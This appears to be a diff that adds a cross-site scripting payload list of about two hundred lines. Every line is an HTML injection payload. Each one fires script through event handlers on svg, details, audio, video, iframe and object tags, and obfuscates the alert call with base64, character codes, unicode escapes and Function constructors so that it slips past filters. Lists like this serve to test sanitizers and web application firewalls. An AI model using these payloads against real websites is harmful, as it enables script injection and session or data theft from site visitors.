@@ -1,0 +1,200 @@
+<audio src onerror=Function('eval(String.fromCharCode(97,108,101,114,116,40,49,41))')()>
+<audio><source onerror="((function(){var a=atob('YWxlcnQoMSk=');eval(a);})())"></audio>
+<details ontoggle="(()=>{new Function('al'+'ert(1)')()})()" open></details>
+<details ontoggle=(Function('\u0061\u006c\u0065\u0072\u0074(1)'))() open></details>
+<details ontoggle=(Function('al'+'ert(1)'))() open>
+<details ontoggle=(Function(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,0x31,41)))() open>
+<details ontoggle=(Function(atob('YWxlcnQoMSk=')))() open></details>
+<details ontoggle=(function(){window['ale'+'rt'](1)})() open>
+<details ontoggle=Function(atob('YWxlcnQoMSk='))() open></details>
+<details open ontoggle="(function(){const f=window['\u0061lert'];f(String.fromCharCode(88,83,83))})()"></details>
+<details open ontoggle="(function(){var a='a'+'lert';window[a](1)})();">
+<details open ontoggle="(function(){var a='al'+String.fromCharCode(101)+'rt';window[a](1);})();">
+<details open ontoggle="(function(){var a='co';var b='nfirm';eval(a+b+'(1)')})()">
+<details open ontoggle="(function(){var a=String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);window[a](1);})()">
+<details open ontoggle="(function(){var a=String.fromCharCode(97,108,101,114,116);window[a]('XSS')})()">
+<details open ontoggle="(function(){var a=String.fromCharCode(97,108,101,114,116);window[a](1);})();">
+<details open ontoggle="(function(){var a=atob('YWxlcnQ=');window[a](1);})();">
+<details open ontoggle="(function(){var e=String.fromCharCode(97,108,101,114,116);window[e](7);})()"></details>
+<details open ontoggle="(function(){var j=String.fromCharCode(97,108,101,114,116);window[j](14);})()"></details>
+<details open ontoggle="(function(){var x=String.fromCharCode(97,108,101,114,116);window[x](1);})()">
+<details open ontoggle="(function(){var x=atob('YWxlcnQ=');window[x](1);})()">
+<details open ontoggle="(function(){window['al'+'ert'](1)})()"></details>
+<details open ontoggle="(function(){with(this){eval('al'+'ert(1)')}})()">
+<details open ontoggle="(new Function('al'+'ert(1)'))()"></details>
+<details open ontoggle="(new Function('ale'+'rt(2)'))()">
+<details open ontoggle="(new Function('con'+'sol'+'e.log(\u0061\u006c\u0065\u0072\u0074(1))'))()"></details>
+<details open ontoggle="(new Function('return al'+'ert'))()('XSS')"></details>
+<details open ontoggle="(new Function('return al'+'ert')).call()(2)">
+<details open ontoggle="(new Function('return wind'+'ow.al'+'ert'))()('XSS')">
+<details open ontoggle="(new Function(String.fromCharCode(97,108,101,114,116)+'(49)'))()">
+<details open ontoggle="Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()">
+<details open ontoggle="Function('&#97;&#108;&#101;&#114;&#116;(1)')()">
+<details open ontoggle="Function('al'+'ert(1)')()">
+<details open ontoggle="Function('al'+'ert(1)')()"></details>
+<details open ontoggle="Function('ale'+'rt(1)')()"></details>
+<details open ontoggle="Function('return eval')()(String.fromCharCode(97,108,101,114,116,40,49,41))">
+<details open ontoggle="Function('return\x20eval')()(atob('YWxlcnQoMSk='))">
+<details open ontoggle="new Function('&#97;&#108;&#101;&#114;&#116;(1)')()"></details>
+<details open ontoggle="new Function('\u0061\u006c\u0065\u0072\u0074(29)')()"></details>
+<details open ontoggle="new Function('al'+'ert(1)')()">
+<details open ontoggle="new Function('al'+'ert(15)')()"></details>
+<details open ontoggle="new Function('al'+String.fromCharCode(101)+'rt(1)')()">
+<details open ontoggle="new Function('ale'+'rt(1)')()"></details>
+<details open ontoggle="new Function('eval(String.fromCharCode(97,108,101,114,116,40,49,41))')()">
+<details open ontoggle="new Function('return ale'+String.fromCharCode(114,116))()(1)">
+<details open ontoggle="new Function(String.fromCharCode(97,108,101,114,116)+'(1)')()"></details>
+<details open ontoggle="new Function(atob('YWxlcnQoMSk='))()">
+<details open ontoggle="new Function(atob('YWxlcnQoMSk='))()"></details>
+<details open ontoggle="new Function(atob('YWxlcnQoMjIp'))()"></details>
+<details open ontoggle="new Function(atob('YWxlcnQoOCk='))()"></details>
+<details open ontoggle="setTimeout(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41))},0)">
+<details open ontoggle="setTimeout(function(){with(document)with(body)appendChild(createElement('script')).text='al\\u0065rt(1)';},0)">
+<details open ontoggle="var a=Function;new a(atob('YWxlcnQoMSk='))()">
+<details open ontoggle='(Function("al"+"ert(1)"))()'>
+<details open ontoggle='(function(){var a=String.fromCharCode(97,108,101,114,116);window[a](1)})()'>
+<details open ontoggle='(function(){with(this)eval("ale"+"rt(1)")})()'></details>
+<details open ontoggle='(new Function("al"+"ert(1)"))()'></details>
+<details open ontoggle='(new Function("var a=btoa;eval(atob(a(String.fromCharCode(97,108,101,114,116,40,49,41))))"))()'>
+<details open ontoggle='(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()'>
+<details open ontoggle='(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()'></details>
+<details open ontoggle='(new Function(\u0061\u006c\u0065\u0072\u0074(1)))()'>
+<details open ontoggle='(new Function(atob("YWxlcnQoMSk=")))()'>
+<details open ontoggle='Function("al"+"ert(1)")()'></details>
+<details open ontoggle='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()'>
+<details open ontoggle='Function(String.fromCharCode(97,108,101,114,116,40,49,41))()'></details>
+<details open ontoggle='Function(atob("YWxlcnQoMSk="))()'></details>
+<details open ontoggle='Function(unescape("%61%6C%65%72%74%28%31%29"))()'></details>
+<details open ontoggle='new Function("\\u0061\\u006c\\u0065\\u0072\\u0074(1)")()'></details>
+<details open ontoggle='new Function("return al" + "ert")(1)()'>
+<details open ontoggle='new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()'>
+<details open ontoggle='new Function(`\u0061lert(1)`)()'></details>
+<details open ontoggle=(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41));})()>
+<details open ontoggle=(function(){eval(atob('YWxlcnQoMSk='))})()>
+<details open ontoggle=(function(){window['a'+'lert']`1`})()>
+<details open ontoggle=Function('al'+'\u0065rt(1)')()>
+<details open ontoggle=Function('al'+'ert(1)')()>
+<details open ontoggle=Function(atob('YWxlcnQoMSk='))()>
+<details open ontoggle=setTimeout(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41))},0)>
+<iframe src="data:text/html,<script>setTimeout(function(){Function('al'+String.fromCharCode(101)+'rt(1)')()},0)</script>">
+<iframe srcdoc="<script>(function(){Function('al'+String.fromCharCode(101)+'rt(1)')()})()</script>"></iframe>
+<iframe srcdoc="<script>(new Function('a'+'lert(1)'))()</script>">
+<iframe srcdoc="<script>new Function('a'+'lert(1)')()</script>">
+<iframe srcdoc="<script>new Function('return \\u0061lert(1)')();</script>"></iframe>
+<iframe srcdoc="<script>self['ale'+'rt'](1)</script>"></iframe>
+<iframe srcdoc="<script>setTimeout(Function('al'+'ert(1)'),0)</script>">
+<iframe srcdoc="<script>setTimeout(function(){eval('ale'+'rt(1)')},0)</script>"></iframe>
+<iframe srcdoc="<script>var a=window; a['ale'+'rt'](1)</script>"></iframe>
+<iframe srcdoc="<svg><script>(function(){let f='al'+'ert';window[f](9);})()</script></svg>"></iframe>
+<iframe srcdoc="<svg><script>new Function('return ale'+'rt(1)')()</script></svg>">
+<object data="data:text/html,<script>(new Function('\u0061\u006c\u0065\u0072\u0074(5)'))()</script>">
+<object data="data:text/html,<script>(new Function(atob('YWxlcnQoMTIp')))()</script>">
+<object data="data:text/html,<script>Function('ale'+String.fromCharCode(114,116)+'(1)')()</script>"></object>
+<object data="data:text/html,<script>new Function('\u0061\u006c\u0065\u0072\u0074(1)')()</script>"></object>
+<object data="data:text/html,<svg onload=Function('al'+'ert(1)')()></svg>"></object>
+<object data='data:text/html,<script>Function("al"+"ert(1)")()</script>'></object>
+<object data='data:text/html,<svg xmlns="http://www.w3.org/2000/svg"><script>eval(atob("YWxlcnQoMSk="))</script></svg>'></object>
+<object type="text/html" data="data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval(&quot;al&quot;+&quot;ert(1)&quot;)'></svg>"></object>
+<svg onload="((function(){var a=String.fromCharCode;eval(a(97,108,101,114,116,40,49,41));})())"></svg>
+<svg onload="((function(){var a=atob;eval(a('YWxlcnQoMSk='));})())"></svg>
+<svg onload="((new Function('al'+String.fromCharCode(101)+'r'+'t(1)'))())"></svg>
+<svg onload="((new Function('return al' + 'ert'))())(1)">
+<svg onload="(function x(){return Function('ale'+'rt(1)')}())()"></svg>
+<svg onload="(function(){const f=window['\u0061lert'];f(String.fromCharCode(88,83,83))})()"></svg>
+<svg onload="(function(){new Function('return ' + atob('YWxlcnQoMSk='))()})()">
+<svg onload="(function(){return Function('ale'+'rt(1)')}())()"></svg>
+<svg onload="(function(){var a=String.fromCharCode(97,108,101,114,116);window[a](1);})();"></svg>
+<svg onload="(function(){var a=String.fromCharCode;var b=a(97)+a(108)+a(101)+a(114)+a(116);window[b](1);})();"></svg>
+<svg onload="(function(){var a=window['al'+'ert'];a(1);})();"></svg>
+<svg onload="(function(){var g='a'+'l'+'ert';window[g](9);})()">
+<svg onload="(function(){var l='a'+'l'+'ert';window[l](16);})()">
+<svg onload="(function(){var x='a'+'lert';window[x](1);})()">
+<svg onload="(function(){var x=atob('YWxlcnQ=');window[x](1);})()">
+<svg onload="(function(){window.atob=Function;atob(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())"></svg>
+<svg onload="(new Function('al'+String.fromCharCode(101,114,116)+'(1)'))()">
+<svg onload="(new Function('return \\u0061\\u006c\\u0065\\u0072\\u0074(1)'))()">
+<svg onload="(new Function('return wind'+'ow\u002eal'+'ert'))()('XSS')">
+<svg onload="(new Function(atob('YWxlcnQoJ1hTUycp'))())"></svg>
+<svg onload="Function('ale'+'rt(16)')()">
+<svg onload="Function('return '+atob('YWxlcnQ=')+'(1)')()">
+<svg onload="Function('return al'+'ert(1)')()">
+<svg onload="Function('return al'+String.fromCharCode(101,114,116)+'(1)')()">
+<svg onload="Function(atob('YWxlcnQoMSk='))()">
+<svg onload="new Function(''+atob('YWxlcnQoMSk='))()">
+<svg onload="new Function('\u0061\u006c\u0065\u0072\u0074(1)')()">
+<svg onload="new Function('al'+String.fromCharCode(101,114,116)+'(1)')()">
+<svg onload="new Function('ale'+'rt(9)')()">
+<svg onload="new Function('return '+String.fromCharCode(97,108,101,114,116)+'(1)')()">
+<svg onload="new Function('return ale' + 'rt')()(1)"></svg>
+<svg onload="new Function(atob('YWxlcnQoMSk='))()"></svg>
+<svg onload="new Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()">
+<svg onload="new Function(unescape('%61%6C%65%72%74%28%31%29'))()"></svg>
+<svg onload="setTimeout(Function('al'+'ert(1)'),0)">
+<svg onload="setTimeout(Function('return al'+'ert(1)'),0)">
+<svg onload="setTimeout(function(){var a=atob('YWxlcnQoMSk=');eval(a)},0)"></svg>
+<svg onload="setTimeout(function(){window['\u0061lert'](9)},0)">
+<svg onload="setTimeout(function(){window['al'+'ert'](1)},0)">
+<svg onload="this.remove();(function(a){return eval(a)}('al'+'ert(1)'))()"></svg>
+<svg onload="this.remove();(new Function('return al'+'ert'))()(1)">
+<svg onload="this.remove();(new Function(atob('YWxlcnQoMSk=')))()">
+<svg onload="this.remove();(new Function(unescape('%61%6C%65%72%74%28%31%29')))()"></svg>
+<svg onload="this.remove();Function(atob('YWxlcnQoMSk='))()">
+<svg onload="this.remove();new Function('eval(String.fromCharCode(97,108,101,114,116,40,49,41))')()"></svg>
+<svg onload='(Function("al"+"er"+"t(1)"))()'></svg>
+<svg onload='(function(){eval(atob("YWxlcnQoMSk="))})()'></svg>
+<svg onload='(function(){var a="a"+"l"+"e"+"r"+"t";window[a](1)})()'>
+<svg onload='(function(){var a=String.fromCharCode(97);var l=String.fromCharCode(108);var e=String.fromCharCode(101);var r=String.fromCharCode(114);var t=String.fromCharCode(116);eval(a+l+e+r+t+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))})()'>
+<svg onload='(function(){var a=String.fromCharCode;window[a(97)+a(108)+a(101)+a(114)+a(116)](1)})()'/>
+<svg onload='(new Function("\u0061\u006c\u0065\u0072\u0074(1)"))()'>
+<svg onload='(new Function("al"+"ert(1)"))()'>
+<svg onload='(new Function("ret"+"urn \u0061lert"))()(1)'>
+<svg onload='(new Function("return \\u0061ler\\u0074"))()(/XSS/)'>
+<svg onload='(new Function("return \u0061\u006c\u0065\u0072\u0074"))()(1)'>
+<svg onload='Function(atob("d2luZG93LmFsZXJ0KDEp"))()'></svg>
+<svg onload='new Function("\u0061\u006c\u0065\u0072\u0074(1)")()' />
+<svg onload='new Function("\u0061\u006c\u0065\u0072\u0074(1)")()'>
+<svg onload='new Function("\u0061\u006c\u0065\u0072\u0074(17)")()'>
+<svg onload='new Function("\u0061\u006c\u0065\u0072\u0074(3)")()'>
+<svg onload='new Function("a"+"l"+"ert(1)")()'>
+<svg onload='new Function("var a=atob(\"YWxlcnQoMSk=\");eval(a);")()'></svg>
+<svg onload='new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()'></svg>
+<svg onload='new Function(String.fromCharCode(97,108,101,114,116,40,50,56,41))()'></svg>
+<svg onload='new Function([].concat(["al"],["ert"]).join("")+"(1)")()'></svg>
+<svg onload='new Function(atob("YWxlcnQoMSk="))()'>
+<svg onload='new Function(atob("YWxlcnQoMjQp"))()'>
+<svg onload='new Function(atob("d2luZG93LmFsZXJ0KDEp"))()'></svg>
+<svg onload='this.remove();(function(){var a=String.fromCharCode(97,108,101,114,116);window[a](1)})()'>
+<svg onload='this.remove();(new Function("al"+"ert(1)"))()'>
+<svg onload=(Function('\u0061\u006c\u0065\u0072\u0074(1)'))()>
+<svg onload=(Function('al'+'ert(1)'))()>
+<svg onload=(Function('al\x65rt(1)'))()>
+<svg onload=(function(){Function('','\x61\x6c\x65\x72\x74(1)')();})()>
+<svg onload=(function(){Function('a'+'ler'+'t(1)')()})()>
+<svg onload=(function(){Function(atob('YWxlcnQoMSk='))()})()>
+<svg onload=(function(){eval(atob('YWxlcnQoMSk='))})()>
+<svg onload=(function(){eval(unescape('%61%6c%65%72%74%28%31%29'));})()>
+<svg onload=(function(){window['a'+'\u006c'+'\u0065'+'\u0072'+'\u0074']('XSS')})()>
+<svg onload=(function(){window['al'+'ert'](1);})()>
+<svg onload=(function(){window[atob('YWxlcnQ=')](1);})()>
+<svg onload=Function('a'+'lert(1)')()>
+<svg onload=Function('a'+String.fromCharCode(108,101,114,116)+'(1)')()>
+<svg onload=Function('al'+'\u0065rt(1)')()>
+<svg onload=Function('al'+'ert(1)')()>
+<svg onload=Function('al'+String.fromCharCode(101)+'rt(1)')()>
+<svg onload=Function('eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)')()>
+<svg onload=Function('eval(unescape(`%61%6c%65%72%74%281%29`))')()>
+<svg onload=Function('setTime'+'out(atob("YWxlcnQoOCk="),0)')()>
+<svg onload=Function(String.fromCharCode(97,108,101,114,116,40,49,41))()>
+<svg onload=Function(atob("YWxlcnQoMSk="))()>
+<svg onload=setTimeout(function(){eval('al'+String.fromCharCode(101)+'rt(1)')},0)>
+<svg><animate onbegin="this.onbegin=null;(new Function('ale'+'rt(22)')).call()"></animate></svg>
+<svg><foreignObject requiredExtensions="http://www.w3.org/1999/xhtml"><iframe srcdoc="&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;"></iframe></foreignObject></svg>
+<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><iframe srcdoc="<script>eval(atob('YWxlcnQoMSk='))</script>"></iframe></div></foreignObject></svg>
+<svg><image href="#" onerror="Function('eval(String.fromCharCode(97,108,101,114,116,40,49,41))')()"></svg>
+<video src onerror="new Function('al'+'ert(1)')()">
+<video src onerror="new Function(atob('YWxlcnQoMSk='))()">
+<video src onerror='(new Function(atob("YWxlcnQoMSk=")))()'>
+<video src onerror='(new Function(atob(&#x22;YWxlcnQoMSk=&#x22;)))()'>
+<video><source onerror="((function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41));})())"></video>
+<video><source onerror="(new Function('al'+'ert(1)'))()"></video>
+<video><source onerror='(new Function("return a"+"lert(1)"))()' src='#'></video>
